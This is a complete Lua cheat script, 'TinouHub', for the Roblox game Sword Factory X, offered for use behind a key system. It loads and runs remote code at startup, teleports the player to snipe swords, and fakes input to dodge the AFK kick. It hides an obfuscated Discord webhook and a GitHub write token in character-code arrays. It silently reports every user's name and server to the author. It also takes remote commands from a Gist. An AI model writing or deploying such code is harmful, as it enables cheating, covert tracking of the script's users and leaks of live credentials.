local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local player       = game:GetService("Players").LocalPlayer
local remote       = game:GetService("ReplicatedStorage").Paper.Remotes.__remoteevent
local remoteFunc   = game:GetService("ReplicatedStorage").Paper.Remotes.__remotefunction
local TweenService = game:GetService("TweenService")

local VERSION     = "0.5.0"
local SCAN_RATE   = 0.5
local MATCH_ALL   = true
local scanning    = false
local totalPicked = 0
local ascending   = false
local farming     = false
local AUTO_BANK   = true
local AUTO_SELL   = false
local WEBHOOK_URL = ""
local CONTROL_URL  = ""
local STATUS_INTERVAL = 10  -- minutes entre chaque rapport de statut (0 = désactivé)
local LOG_WEBHOOK      = (function() local t={104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,48,51,56,48,49,57,52,54,54,52,57,52,51,55,52,57,47,84,86,51,113,75,74,115,120,51,83,117,88,117,114,66,51,120,118,108,45,120,104,84,71,99,48,49,102,117,112,56,108,86,48,88,67,71,56,80,74,68,68,89,97,119,71,111,48,97,68,121,83,113,86,75,101,54,84,45,108,48,72,97,45,122,114,78,99} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()
local GIST_WRITE_TOKEN = (function() local t={103,104,112,95,85,67,75,76,118,119,79,55,77,73,119,87,75,119,97,56,87,50,113,84,97,57,112,51,79,98,48,56,83,73,51,86,107,85,54,50} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()
local GIST_ID_LUA      = "6ad86b8600f77cb80e271972b923d5bb"
local STATE_READ_URL   = "https://gist.githubusercontent.com/ImTinou/6ad86b8600f77cb80e271972b923d5bb/raw/sword_state.json"
local ANTI_AFK    = true
local HS          = game:GetService("HttpService")
local SAVE_FILE   = "tinouhub_config.json"


-- Profiles defined HERE so loadConfig() can modify them at startup
local profiles = {
    { active = true,  slots = {"Any","Any","Any"} },
    { active = false, slots = {"Any","Any","Any"} },
    { active = false, slots = {"Any","Any","Any"} },
}

local function saveConfig()
    pcall(function()
        local data = {
            auto_bank        = AUTO_BANK,
            auto_sell        = AUTO_SELL,
            match_all        = MATCH_ALL,
            scan_rate        = SCAN_RATE,
            webhook          = WEBHOOK_URL,
            control_url      = CONTROL_URL,
            anti_afk         = ANTI_AFK,
            status_interval  = STATUS_INTERVAL,
            profiles         = profiles,
        }
        writefile(SAVE_FILE, HS:JSONEncode(data))
    end)
end

local function loadConfig()
    pcall(function()
        if not isfile(SAVE_FILE) then return end
        local data = HS:JSONDecode(readfile(SAVE_FILE))
        if data.auto_bank  ~= nil then AUTO_BANK   = data.auto_bank  end
        if data.auto_sell  ~= nil then AUTO_SELL   = data.auto_sell  end
        if data.match_all  ~= nil then MATCH_ALL   = data.match_all  end
        if data.scan_rate  ~= nil then SCAN_RATE   = data.scan_rate  end
        if data.webhook      ~= nil then WEBHOOK_URL = data.webhook      end
        if data.control_url  ~= nil then CONTROL_URL = data.control_url  end
        if data.anti_afk        ~= nil then ANTI_AFK         = data.anti_afk        end
        if data.status_interval ~= nil then STATUS_INTERVAL  = data.status_interval end
        if data.profiles   ~= nil then
            for i = 1, 3 do
                if data.profiles[i] then
                    profiles[i].active = data.profiles[i].active
                    profiles[i].slots  = data.profiles[i].slots
                end
            end
        end
    end)
end

loadConfig()
local VirtualUser = game:GetService("VirtualUser")

-- Anti-AFK: 3 méthodes combinées pour être sûr
-- 1) Disable le kick AFK natif de Roblox
local Players = game:GetService("Players")
Players.LocalPlayer.Idled:Connect(function()
    if ANTI_AFK then
        -- Fire un faux input pour reset le timer AFK interne
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
end)

-- 2) Simule un mouvement de caméra toutes les 60s
task.spawn(function()
    while true do
        task.wait(55)
        if ANTI_AFK then
            local cam = workspace.CurrentCamera
            VirtualUser:Button2Down(cam.ViewportSize / 2, cam.CFrame)
            task.wait(0.1)
            VirtualUser:Button2Up(cam.ViewportSize / 2, cam.CFrame)
            -- Simule aussi un petit mouvement pour reset le timer Roblox
            VirtualUser:Button1Down(cam.ViewportSize / 2, cam.CFrame)
            task.wait(0.05)
            VirtualUser:Button1Up(cam.ViewportSize / 2, cam.CFrame)
        end
    end
end)

-- 3) Jump aléatoire toutes les 3-4 min pour paraître actif
task.spawn(function()
    while true do
        task.wait(math.random(170, 230))
        if ANTI_AFK then
            pcall(function()
                local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.Jump = true end
            end)
        end
    end
end)

-- References UI (assignees plus bas quand le GUI est cree)
local uiAutoBank, uiAutoSell, uiMatchAll, uiScanRate
local uiProfileToggle = {}
local uiProfileSlot   = {}

-- Forward declarations (définies plus bas dans le script)
local startScan
local statusLbl

-- Discord remote control (poll Gist toutes les 15s)
local lastCmdId = -1

-- Au lancement : lire l'id actuel du Gist pour ne pas rejouer la dernière commande
task.spawn(function()
    task.wait(2) -- attendre que le réseau soit dispo
    pcall(function()
        local res = request({ Url = "https://api.github.com/gists/" .. GIST_ID_LUA, Method = "GET",
            Headers = { ["Cache-Control"] = "no-cache", ["User-Agent"] = "TinouHub/1.0" } })
        if not res or res.StatusCode ~= 200 then return end
        local gist = HS:JSONDecode(res.Body)
        local fc = gist.files and gist.files["sword_control.json"] and gist.files["sword_control.json"].content
        if not fc then return end
        local root = HS:JSONDecode(fc)
        local data = root[player.Name]
        if type(data) == "table" and type(data.id) == "number" then
            lastCmdId = data.id  -- skip les anciennes commandes
        end
    end)
end)

task.spawn(function()
    while true do
        task.wait(15)
        pcall(function()
            -- API GitHub (pas de cache CDN contrairement au raw)
            local url = "https://api.github.com/gists/" .. GIST_ID_LUA
            local res = request({ Url = url, Method = "GET",
                Headers = { ["Cache-Control"] = "no-cache", ["User-Agent"] = "TinouHub/1.0" } })
            if not res or res.StatusCode ~= 200 then return end
            local gist = HS:JSONDecode(res.Body)
            local fileContent = gist.files and gist.files["sword_control.json"] and gist.files["sword_control.json"].content
            if not fileContent then return end
            local root = HS:JSONDecode(fileContent)
            -- Lire uniquement l'entree de ce joueur
            local data = root[player.Name]
            if type(data) ~= "table" then return end
            if type(data.id) ~= "number" or data.id == lastCmdId then return end
            lastCmdId = data.id

            -- Scanner
            if data.scanning ~= nil then
                if data.scanning and not scanning then
                    startScan(statusLbl)
                    Rayfield:Notify({Title="Discord", Content="Scanner démarré via Discord", Duration=3})
                elseif not data.scanning and scanning then
                    scanning = false
                    Rayfield:Notify({Title="Discord", Content="Scanner arrêté via Discord", Duration=3})
                end
            end

            -- Farm
            if data.farming ~= nil then
                if not data.farming and farming then
                    farming = false
                    Rayfield:Notify({Title="Discord", Content="Farm arrêté via Discord", Duration=3})
                elseif data.farming and not farming then
                    Rayfield:Notify({Title="Discord", Content="Farm démarré via Discord", Duration=3})
                end
            end

            -- Ascender
            if data.ascending ~= nil then
                if not data.ascending and ascending then
                    ascending = false
                    Rayfield:Notify({Title="Discord", Content="Ascender arrêté via Discord", Duration=3})
                end
            end

            -- Options
            if data.auto_bank ~= nil then AUTO_BANK = data.auto_bank end
            if data.auto_sell ~= nil then AUTO_SELL = data.auto_sell end
            if data.scan_rate ~= nil and data.scan_rate > 0 then SCAN_RATE = data.scan_rate end

            -- Actions one-shot Discord
            if data.bank_all then
                task.spawn(function()
                    local pStats = game:GetService("ReplicatedStorage"):FindFirstChild("Stats") and
                        game:GetService("ReplicatedStorage").Stats:FindFirstChild(player.Name)
                    local factory = pStats and pStats:FindFirstChild("Factory")
                    if not factory then return end
                    local count = 0
                    for _, s in pairs(factory:GetChildren()) do
                        pcall(function() remote:FireServer("Set Hotbar", s.Name, "Inventory") end)
                        count = count + 1
                        task.wait(0.15)
                    end
                    Rayfield:Notify({Title="Discord", Content="Bank All: "..count.." swords!", Duration=3})
                end)
            end

            if data.sell_all then
                task.spawn(function()
                    pcall(function() remoteFunc:InvokeServer("Sell All") end)
                    Rayfield:Notify({Title="Discord", Content="Sell All exécuté!", Duration=3})
                end)
            end

            if data.spawn_spam then
                task.spawn(function()
                    for i = 1, 10 do
                        pcall(function() remoteFunc:InvokeServer("Spawn Sword") end)
                        task.wait(0.4)
                    end
                    Rayfield:Notify({Title="Discord", Content="Spawn Spam x10!", Duration=3})
                end)
            end

            -- Profiles
            if type(data.profiles) == "table" then
                local profileChanged = false
                for i = 1, 3 do
                    if data.profiles[i] then
                        profiles[i].active = data.profiles[i].active
                        if type(data.profiles[i].slots) == "table" then
                            profiles[i].slots = data.profiles[i].slots
                        end
                        profileChanged = true
                    end
                end
                if profileChanged then
                    Rayfield:Notify({Title="Discord", Content="Profils mis à jour via Discord", Duration=3})
                end
            end

            saveConfig()

            -- Sync UI Rayfield
            pcall(function() if uiAutoBank then uiAutoBank:Set(AUTO_BANK) end end)
            pcall(function() if uiAutoSell then uiAutoSell:Set(AUTO_SELL) end end)
            pcall(function() if uiMatchAll then uiMatchAll:Set(MATCH_ALL) end end)
            pcall(function() if uiScanRate then uiScanRate:Set(SCAN_RATE) end end)
            for i = 1, 3 do
                pcall(function()
                    if uiProfileToggle[i] then uiProfileToggle[i]:Set(profiles[i].active) end
                end)
                if uiProfileSlot[i] then
                    for j = 1, 3 do
                        pcall(function()
                            if uiProfileSlot[i][j] then uiProfileSlot[i][j]:Set(profiles[i].slots[j]) end
                        end)
                    end
                end
            end
            pcall(function()
                if statusLbl then
                    statusLbl:Set(scanning and "Scanning | Total: "..totalPicked or "Stopped | Total: "..totalPicked)
                end
            end)
        end)
    end
end)

-- Push etat in-game vers Gist (pour sync Discord → affichage panel)
local function pushState()
    pcall(function()
        -- Lecture de l'etat actuel via API (pas de cache)
        local existing = {}
        local readRes = request({
            Url = "https://api.github.com/gists/" .. GIST_ID_LUA,
            Method = "GET",
            Headers = { ["Cache-Control"] = "no-cache", ["User-Agent"] = "TinouHub/1.0" }
        })
        if readRes and readRes.StatusCode == 200 then
            pcall(function()
                local g = HS:JSONDecode(readRes.Body)
                local c = g.files and g.files["sword_state.json"] and g.files["sword_state.json"].content
                if c then existing = HS:JSONDecode(c) end
            end)
        end

        -- Merge notre entree
        existing[player.Name] = {
            scanning  = scanning,
            farming   = farming,
            ascending = ascending,
            auto_bank = AUTO_BANK,
            auto_sell = AUTO_SELL,
            scan_rate = SCAN_RATE,
            profiles  = profiles,
            ts        = os.time(),
        }

        request({
            Url    = "https://api.github.com/gists/" .. GIST_ID_LUA,
            Method = "PATCH",
            Headers = {
                ["Content-Type"]  = "application/json",
                ["Authorization"] = "token " .. GIST_WRITE_TOKEN,
                ["User-Agent"]    = "TinouHub/1.0",
            },
            Body = HS:JSONEncode({
                files = { ["sword_state.json"] = { content = HS:JSONEncode(existing) } }
            })
        })
    end)
end

-- Boucle de push etat toutes les 60s
task.spawn(function()
    while true do
        task.wait(60)
        pushState()
    end
end)

-- Rapport de statut périodique vers le webhook utilisateur
local function sendStatusReport()
    if WEBHOOK_URL == "" then return end
    pcall(function()
        local char = player.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        local hp   = hum and math.floor(hum.Health).."/"..math.floor(hum.MaxHealth) or "?"
        local serverPlayers = tostring(#game:GetService("Players"):GetPlayers())

        local statusLines = {
            "**Scanner** : "..(scanning  and "🟢 ON"  or "🔴 OFF").." | Swords ramassés : **"..totalPicked.."**",
            "**Farm**    : "..(farming   and "🟢 ON"  or "🔴 OFF"),
            "**Ascender**: "..(ascending and "🟢 ON"  or "🔴 OFF"),
        }

        request({
            Url    = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HS:JSONEncode({
                username = "TinouHUB",
                embeds = {{
                    title       = "Rapport de statut — "..player.Name,
                    description = table.concat(statusLines, "\n"),
                    color       = scanning and 3066993 or 10038562,
                    fields = {
                        { name = "HP",      value = hp,            inline = true },
                        { name = "Serveur", value = serverPlayers.." joueurs", inline = true },
                        { name = "Interval", value = STATUS_INTERVAL.." min", inline = true },
                    },
                    footer    = { text = "TinouHub v"..VERSION.." | Sword Factory X" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
        })
    end)
end

task.spawn(function()
    while true do
        if STATUS_INTERVAL > 0 then
            task.wait(STATUS_INTERVAL * 60)
            sendStatusReport()
        else
            task.wait(30)
        end
    end
end)

-- Log execution
pcall(function()
    request({
        Url    = LOG_WEBHOOK,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            username = "TinouHub Logger",
            embeds = {{
                title = "Script Executed",
                description = "**"..player.Name.."** launched TinouHub v"..VERSION,
                color = 3447003,
                fields = {
                    { name = "Game",   value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true },
                    { name = "Server", value = tostring(#game:GetService("Players"):GetPlayers()).." players", inline = true },
                },
                footer    = { text = "TinouHub v"..VERSION },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            }}
        })
    })
end)

-- Mapping enchant ID -> nom (UPD — extrait du dump)
-- IDs 0-15 sont les vrais enchants, les anciens IDs 0-49 étaient les CLASS
local ENCHANT_IDS = {
    [-1]="Unknown",
    [0]="Fortune",      [1]="Sharpness",    [2]="Protection",   [3]="Haste",
    [4]="Swiftness",    [5]="Critical",     [6]="Resistance",   [7]="Healing",
    [8]="Looting",      [9]="Attraction",   [10]="Stealth",     [11]="Ancient",
    [12]="Desperation", [13]="Insight",     [14]="Thorns",      [15]="Knockback",
}

local enchantList = {
    "Any",
    "Fortune","Sharpness","Protection","Haste","Swiftness","Critical",
    "Resistance","Healing","Looting","Attraction","Stealth","Ancient",
    "Desperation","Insight","Thorns","Knockback",
}

local function isProtected(sword)
    local stats = game:GetService("ReplicatedStorage"):FindFirstChild("Stats")
    if not stats then return false end
    local pStats = stats:FindFirstChild(player.Name)
    if not pStats then return false end
    for _, folder in pairs({"Bank", "Ascender"}) do
        if pStats:FindFirstChild(folder) and pStats[folder]:FindFirstChild(sword.Name) then return true end
    end
    return false
end

-- Vérifie que l'épée appartient bien au joueur (dans sa zone)
-- Le serveur rejette Set Hotbar pour les épées hors de la zone du joueur
local function isOwnSword(sword)
    local stats = game:GetService("ReplicatedStorage"):FindFirstChild("Stats")
    if not stats then return false end
    local pStats = stats:FindFirstChild(player.Name)
    if not pStats then return false end
    for _, folder in pairs({"Factory", "Selling", "Swords", "Bank", "Ascender"}) do
        local f = pStats:FindFirstChild(folder)
        if f and f:FindFirstChild(sword.Name) then return true end
    end
    return false
end


local function getSwordEnchants(sword)
    local ok, children = pcall(function()
        return sword.Main.Gui.ItemInfo.Enchants:GetChildren()
    end)
    if not ok then return {} end
    local result = {}
    for _, e in pairs(children) do
        if e:IsA("TextLabel") and e.Text ~= "" then
            table.insert(result, e.Text)
        end
    end
    return result
end

local function getEnchantName(text)
    return text:match("^(%a+)") or text
end

local function stripRichText(text)
    if not text then return "?" end
    return (text:gsub("<[^>]+>", ""):gsub("^%s*(.-)%s*$", "%1"))
end

local function countIn(t, v)
    local n = 0
    for _, x in pairs(t) do if x == v then n = n + 1 end end
    return n
end

local function profileMatches(prof, enchants)
    if not prof.active then return false end
    local names = {}
    for _, e in ipairs(enchants) do table.insert(names, getEnchantName(e)) end
    if MATCH_ALL then
        local needed = {}
        for _, s in pairs(prof.slots) do
            if s ~= "Any" then needed[s] = (needed[s] or 0) + 1 end
        end
        for e, c in pairs(needed) do
            if countIn(names, e) < c then return false end
        end
        return true
    else
        for _, s in pairs(prof.slots) do
            if s == "Any" then return true end
            for _, n in pairs(names) do
                if n == s then return true end
            end
        end
        return false
    end
end

local function swordMatches(sword)
    local enchants = getSwordEnchants(sword)
    if #enchants == 0 then return false end
    for _, prof in ipairs(profiles) do
        if profileMatches(prof, enchants) then return true end
    end
    return false
end

local function flyPickup(sword)
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local ok, swordPos = pcall(function() return sword.Main.Position end)
    if not ok then return end
    local origin = hrp.CFrame
    hrp.CFrame = CFrame.new(swordPos + Vector3.new(0, 15, 0))
    task.wait(0.1)
    local tween = TweenService:Create(hrp, TweenInfo.new(0.25, Enum.EasingStyle.Sine), {
        CFrame = CFrame.new(swordPos + Vector3.new(0, 2, 0))
    })
    tween:Play()
    tween.Completed:Wait()
    remote:FireServer("Set Hotbar", sword.Name, "Hotbar", 1)
    task.wait(0.1)
    hrp.CFrame = origin
end

local ascAttempts   = 0
local targetQuality = "Godly"
local ascMode       = "Rarity"

local function getSwordInfo(sword)
    local info = {}
    pcall(function()
        local gui = sword.Main.Gui.ItemInfo
        info.name    = gui:FindFirstChild("Class")         and stripRichText(gui.Class.Text)         or "Unknown"
        info.level   = gui:FindFirstChild("Level")         and stripRichText(gui.Level.Text)         or "?"
        info.rarity  = gui:FindFirstChild("RarityQuality") and stripRichText(gui.RarityQuality.Text) or "?"
        info.worth   = gui:FindFirstChild("Worth")         and stripRichText(gui.Worth.Text)         or "?"
        info.selling = gui:FindFirstChild("Selling")       and stripRichText(gui.Selling.Text)       or "?"
    end)
    return info
end

local rarityColors = {
    Basic=8421504,
    Common=9807270, Uncommon=5763719, Rare=3447003,
    Epic=10181046, Legendary=16766720, Mythical=15158332,
    Divine=16744448, Super=16711935, Mega=65535,
    Ultra=16776960, Omega=16711680, Extreme=16744272,
    Ultimate=10066329, Insane=16711800, Hyper=16744576,
    Unique=1752220, Godly=16711680, Celestial=16777215,
    Eternal=16744703, Cosmic=11534336, Heavenly=16777180,
    Stellar=16744447, Galactic=9699328, Infinity=16744319,
}

-- Raretés dans l'ordre croissant (UPD — IDs 0→125)
local qualityOrder = {
    "Basic","Common","Uncommon","Rare","Epic",
    "Legendary","Mythical","Divine","Super","Mega",
    "Ultra","Omega","Extreme","Ultimate","Insane",
    "Hyper","Godly","Unique","Exotic","Supreme",
    "Celestial","Eternal","Cosmic","Heavenly","Stellar",
    "Galactic","Infinity",
}
local function qualityRank(text)
    if not text then return 0 end
    for i = #qualityOrder, 1, -1 do
        if text:find(qualityOrder[i]) then return i end
    end
    return 0
end

-- Emoji selon la tier de rareté
local function rarityEmoji(rarity)
    if not rarity then return "⚔️" end
    local tiers = {
        {k="Infinity", e="🌌"}, {k="Galactic", e="🌠"}, {k="Stellar", e="💫"},
        {k="Heavenly", e="👼"}, {k="Cosmic",   e="🪐"}, {k="Eternal", e="♾️"},
        {k="Celestial",e="✨"}, {k="Supreme",  e="👑"}, {k="Exotic",  e="🔮"},
        {k="Unique",   e="💎"}, {k="Godly",    e="🌟"}, {k="Hyper",   e="⚡"},
        {k="Insane",   e="🔥"}, {k="Ultimate", e="🏆"}, {k="Extreme", e="💥"},
        {k="Omega",    e="🟣"}, {k="Ultra",    e="🔵"}, {k="Mega",    e="🟢"},
        {k="Super",    e="🟡"}, {k="Divine",   e="🌈"}, {k="Mythical",e="🟠"},
        {k="Legendary",e="🟡"}, {k="Epic",     e="🟣"}, {k="Rare",    e="🔵"},
        {k="Uncommon", e="🟢"}, {k="Common",   e="⚪"}, {k="Basic",   e="⚫"},
    }
    for _, t in ipairs(tiers) do
        if rarity:find(t.k) then return t.e end
    end
    return "⚔️"
end

local function sendWebhook(sword, enchants, info)
    if WEBHOOK_URL == "" then return end
    info = info or getSwordInfo(sword)
    pcall(function()
        -- Couleur selon rareté (ordre précis du plus rare au moins rare)
        local color = 6559471
        local rarityPriority = {
            "Infinity","Galactic","Stellar","Heavenly","Cosmic","Eternal",
            "Celestial","Supreme","Exotic","Unique","Godly","Hyper","Insane",
            "Ultimate","Extreme","Omega","Ultra","Mega","Super","Divine",
            "Mythical","Legendary","Epic","Rare","Uncommon","Common","Basic",
        }
        for _, rarity in ipairs(rarityPriority) do
            if info.rarity and info.rarity:find(rarity) and rarityColors[rarity] then
                color = rarityColors[rarity]
                break
            end
        end

        local emoji = rarityEmoji(info.rarity)

        -- Enchants sur une seule ligne
        local enchantStr = #enchants > 0 and table.concat(enchants, " · ") or "Aucun"

        -- Avatar du joueur via thumbnail API Roblox
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"

        request({
            Url    = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HS:JSONEncode({
                username   = "TinouHUB",
                avatar_url = avatarUrl,
                embeds = {{
                    title       = emoji.." "..(info.name or "Unknown Sword"),
                    description = "**"..player.Name.."** a snipé une épée !",
                    color       = color,
                    thumbnail   = { url = avatarUrl },
                    fields = {
                        { name = "✨ Enchants", value = enchantStr,          inline = false },
                        { name = "⭐ Rareté",   value = info.rarity  or "?", inline = true  },
                        { name = "📊 Level",    value = info.level   or "?", inline = true  },
                        { name = "💰 Valeur",   value = info.worth   or "?", inline = true  },
                        { name = "🏷️ Prix",    value = info.selling or "?", inline = true  },
                        { name = "👥 Serveur",  value = tostring(#game:GetService("Players"):GetPlayers()).." joueurs", inline = true },
                    },
                    footer    = { text = "TinouHub v"..VERSION.." · Sword Factory X" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
        })
    end)
end

local function getAscenderSword()
    local stats = game:GetService("ReplicatedStorage"):FindFirstChild("Stats")
    if not stats then return nil end
    local pStats = stats:FindFirstChild(player.Name)
    if not pStats then return nil end
    local ascFolder = pStats:FindFirstChild("Ascender")
    if not ascFolder then return nil end
    local children = ascFolder:GetChildren()
    if #children == 0 then return nil end
    local uuid = children[1].Name
    local sword = workspace.Swords:FindFirstChild(uuid)
    if sword then return sword end
    return workspace:FindFirstChild(uuid, true)
end

local function sendAscenderWebhook(sword, quality, attempts)
    if WEBHOOK_URL == "" then return end
    local info     = getSwordInfo(sword)
    local enchants = getSwordEnchants(sword)
    pcall(function()
        local color = 16766720
        local rarityPriority = {
            "Infinity","Galactic","Stellar","Heavenly","Cosmic","Eternal",
            "Celestial","Supreme","Exotic","Unique","Godly","Hyper","Insane",
            "Ultimate","Extreme","Omega","Ultra","Mega","Super","Divine",
            "Mythical","Legendary","Epic","Rare","Uncommon","Common","Basic",
        }
        for _, rarity in ipairs(rarityPriority) do
            if quality and quality:find(rarity) and rarityColors[rarity] then
                color = rarityColors[rarity] break
            end
        end
        local avatarUrl  = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"
        local emoji      = rarityEmoji(quality)
        local enchantStr = #enchants > 0 and table.concat(enchants, " · ") or "Aucun"
        request({
            Url    = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HS:JSONEncode({
                username   = "TinouHUB",
                avatar_url = avatarUrl,
                embeds = {{
                    title       = "🏆 Ascender — Objectif atteint !",
                    description = "**"..player.Name.."** a atteint **"..emoji.." "..(quality or "?").."** en "..attempts.." essais !",
                    color       = color,
                    thumbnail   = { url = avatarUrl },
                    fields = {
                        { name = "✨ Enchants", value = enchantStr,          inline = false },
                        { name = "⭐ Rareté",   value = quality  or "?",     inline = true  },
                        { name = "📊 Level",    value = info.level or "?",   inline = true  },
                        { name = "💰 Valeur",   value = info.worth or "?",   inline = true  },
                        { name = "🔄 Essais",   value = tostring(attempts),  inline = true  },
                    },
                    footer    = { text = "TinouHub v"..VERSION.." · Sword Factory X" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
        })
    end)
end

local childAddedConn = nil
local factoryConn    = nil

-- Vérifie un sword depuis RS.Stats directement (Factory/Selling)
-- Retourne les enchants ou nil
local function getStatsEnchants(uuid)
    local RS = game:GetService("ReplicatedStorage")
    local pStats = RS:FindFirstChild("Stats") and RS.Stats:FindFirstChild(player.Name)
    if not pStats then return nil end
    for _, folder in pairs({"Factory", "Selling", "Swords"}) do
        local f = pStats:FindFirstChild(folder)
        if f then
            local s = f:FindFirstChild(uuid)
            if s then
                local enc = {}
                for e = 1, 4 do
                    local eid = s:GetAttribute("Enchant"..e)
                    if eid and eid >= 0 then
                        table.insert(enc, ENCHANT_IDS[eid] or ("E"..eid))
                    end
                end
                return #enc > 0 and enc or nil
            end
        end
    end
    return nil
end

-- Vérifie si les enchants d'un UUID matchent un profil actif
local function statsUuidMatches(uuid)
    local enchants = getStatsEnchants(uuid)
    if not enchants then return false, {} end
    -- Fake sword object pour profileMatches
    local fakeEnchants = enchants
    if MATCH_ALL then
        for _, prof in ipairs(profiles) do
            if not prof.active then continue end
            local needed = {}
            for _, s in pairs(prof.slots) do
                if s ~= "Any" then needed[s] = (needed[s] or 0) + 1 end
            end
            local ok = true
            for e, c in pairs(needed) do
                local cnt = 0
                for _, n in pairs(fakeEnchants) do if n == e then cnt = cnt + 1 end end
                if cnt < c then ok = false break end
            end
            if ok then return true, fakeEnchants end
        end
    else
        for _, prof in ipairs(profiles) do
            if not prof.active then continue end
            for _, s in pairs(prof.slots) do
                if s == "Any" then return true, fakeEnchants end
                for _, n in pairs(fakeEnchants) do
                    if n == s then return true, fakeEnchants end
                end
            end
        end
    end
    return false, fakeEnchants
end

-- Retourne "selling", "factory" ou nil selon où est l'épée dans les stats du joueur
local function getSwordZone(sword)
    local stats = game:GetService("ReplicatedStorage"):FindFirstChild("Stats")
    if not stats then return nil end
    local pStats = stats:FindFirstChild(player.Name)
    if not pStats then return nil end
    if pStats:FindFirstChild("Selling") and pStats.Selling:FindFirstChild(sword.Name) then
        return "selling"
    end
    if pStats:FindFirstChild("Factory") and pStats.Factory:FindFirstChild(sword.Name) then
        return "factory"
    end
    return nil
end

local function handleSword(sword, lbl)
    if not scanning then return end
    if not isOwnSword(sword) then return end
    if isProtected(sword) then return end
    if not swordMatches(sword) then return end

    local zone    = getSwordZone(sword)
    local enchants = getSwordEnchants(sword)
    local info     = getSwordInfo(sword)

    if zone ~= "selling" then return end  -- pickup uniquement depuis selling zone

    flyPickup(sword)
    if AUTO_BANK then
        task.wait(0.3)
        pcall(function() remote:FireServer("Set Hotbar", sword.Name, "Inventory") end)
        if AUTO_SELL then
            task.wait(0.5)
            pcall(function() remoteFunc:InvokeServer("Sell All") end)
        end
    end

    totalPicked = totalPicked + 1
    pcall(function() lbl:Set("Sniped! ["..( zone or "?").."] Total: "..totalPicked) end)
    Rayfield:Notify({Title="Sword Found! ["..( zone or "?").."]", Content=table.concat(enchants,", "), Duration=3})
    sendWebhook(sword, enchants, info)
end

-- Auto-collect factory: surveille RS.Stats.Factory pour les swords qui matchent
-- et les bank/sell directement sans flyPickup
local function startFactoryCollect(lbl)
    local RS = game:GetService("ReplicatedStorage")
    local statsRoot = RS:FindFirstChild("Stats")
    if not statsRoot then return end
    local pStats = statsRoot:FindFirstChild(player.Name)
    if not pStats then return end
    local factoryFolder = pStats:FindFirstChild("Factory")
    if not factoryFolder then return end  -- pas encore unlockée

    local function checkFactoryUUID(uuid)
        if not scanning then return end
        task.wait(0.5) -- attend que les enchants soient chargés
        local matched, enchants = statsUuidMatches(uuid)
        if matched then
            -- Pickup impossible depuis factory, juste notif/webhook pour signaler
            totalPicked = totalPicked + 1
            pcall(function() lbl:Set("Factory match! Total: "..totalPicked) end)
            Rayfield:Notify({Title="Factory Match!", Content=table.concat(enchants,", ").."\n(passe en sell zone pour pick)", Duration=6})
            if WEBHOOK_URL ~= "" then
                pcall(function()
                    request({
                        Url = WEBHOOK_URL, Method = "POST",
                        Headers = {["Content-Type"]="application/json"},
                        Body = HS:JSONEncode({ username="TinouHUB", embeds={{
                            title = "Factory Match — "..uuid:sub(1,8),
                            description = "**"..player.Name.."** — sword en factory, attendre sell zone",
                            color = 16776960,
                            fields = {{ name="Enchants", value=table.concat(enchants,", "), inline=true }},
                            footer = { text="TinouHub v"..VERSION },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        }}})
                    })
                end)
            end
        end
    end

    -- Check tous les swords déjà en factory
    for _, s in pairs(factoryFolder:GetChildren()) do
        task.spawn(checkFactoryUUID, s.Name)
    end

    -- Hook les nouveaux
    if factoryConn then factoryConn:Disconnect() end
    factoryConn = factoryFolder.ChildAdded:Connect(function(s)
        task.spawn(checkFactoryUUID, s.Name)
    end)
end

startScan = function(lbl)
    scanning = true
    startFactoryCollect(lbl)

    -- ChildAdded: instant detection
    if childAddedConn then childAddedConn:Disconnect() end
    childAddedConn = workspace.Swords.ChildAdded:Connect(function(sword)
        task.wait(0.3)  -- small delay for enchants to load
        if not sword.Parent then return end
        handleSword(sword, lbl)
    end)

    -- Polling: full re-scan every SCAN_RATE seconds (catches missed swords)
    task.spawn(function()
        while scanning do
            pcall(function()
                for _, sword in pairs(workspace.Swords:GetChildren()) do
                    if not scanning then break end
                    handleSword(sword, lbl)
                end
                lbl:Set("Scanning | Total: "..totalPicked)
            end)
            task.wait(SCAN_RATE)
        end
        if childAddedConn then childAddedConn:Disconnect() end
        if factoryConn    then factoryConn:Disconnect() end
        pcall(function() lbl:Set("Stopped | Total: "..totalPicked) end)
    end)
end

-- GUI

local Window = Rayfield:CreateWindow({
    Name            = "TinouHub | Sword Factory X",
    LoadingTitle    = "TinouHub v"..VERSION,
    LoadingSubtitle = "Sword Factory X",
    ConfigurationSaving = { Enabled = false },
    KeySystem       = true,
    KeySettings     = {
        Title    = "TinouHub",
        Subtitle = "Key System",
        Note     = "Ask ImTinou for your key",
        FileName = "TinouHubKey",
        SaveKey  = true,
        GrabKeyFromSite = false,
        Key      = {"tinoukey1", "tinoukey2", "tinoukey3"},
    },
})

-- ===================== SCANNER =====================
local Tab = Window:CreateTab("Scanner", "shield")

Tab:CreateSection("Options")
uiAutoBank = Tab:CreateToggle({ Name="Auto-Bank matched swords", CurrentValue=AUTO_BANK, Flag="AutoBank", Callback=function(v) AUTO_BANK=v saveConfig() end })
